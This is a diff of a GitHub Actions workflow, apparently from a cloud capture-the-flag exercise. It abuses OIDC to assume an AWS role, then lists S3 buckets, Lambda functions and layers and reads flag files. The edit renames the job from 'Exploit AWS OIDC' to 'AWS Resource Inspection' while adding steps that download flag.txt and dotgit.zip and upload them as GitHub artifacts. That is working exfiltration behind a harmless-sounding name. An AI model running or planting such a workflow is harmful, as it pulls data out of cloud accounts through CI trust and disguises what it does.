@@ -1,4 +1,4 @@
-name: Exploit AWS OIDC
+name: AWS Resource Inspection
 
 on:
   push:
@@ -10,43 +10,24 @@ permissions:
   contents: read
 
 jobs:
-  exploit:
+  inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: Configure AWS Credentials via OIDC
+      - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Recon - List Resources
+      - name: Download S3 Objects
         run: |
+          mkdir -p downloads
+          # ניסיון הורדה מכל אחד מהדליים שנמצאו
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt ./downloads/flag.txt || true
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip ./downloads/dotgit.zip || true
 
-          aws s3 cp s3://s3://platform-bucket-009661764077/flag.txt ./flag.txt || true
-          cat flag.txt
-
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt ./flag.txt || true 
-          cat flag.txt
-
-         aws s3 cp s3://site781fe43f26b9eba3/flag.txt ./flag.txt || true
-         cat flag.txt
-
-
-          echo ""=== 1 dude :"
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive || true
-          aws s3 ls s3://codec4f26c862a321ef5 --recursive || true 
-          aws s3 ls s3://site781fe43f26b9eba3 --recursive || true
-
-           echo "=== 2 dude :"
-          aws lambda get-function --function-name nslookupv2 || true
-
-           echo "=== 3 dude :"
-          aws lambda get-layer-version --layer-name arn:aws:lambda:us-east-1:009661764077:layer:nslookup_layer --version-number 8 || true
-
- 
-          
-          echo "=== lamda function - origianl cor, envirmonet variable or libarires: ==="
-          aws lambda get-function --function-name nslookupv2 || true
-          
-          echo "=== Lambda Functions specipic layers ==="
-          aws lambda get-layer-version --layer-name arn:aws:lambda:us-east-1:009661764077:layer:aws_cli_layer --version-number 8 || true
+      - name: Upload Artifacts to GitHub
+        uses: actions/upload-artifact@v4
+        with:
+          name: aws-inspected-files
+          path: downloads/
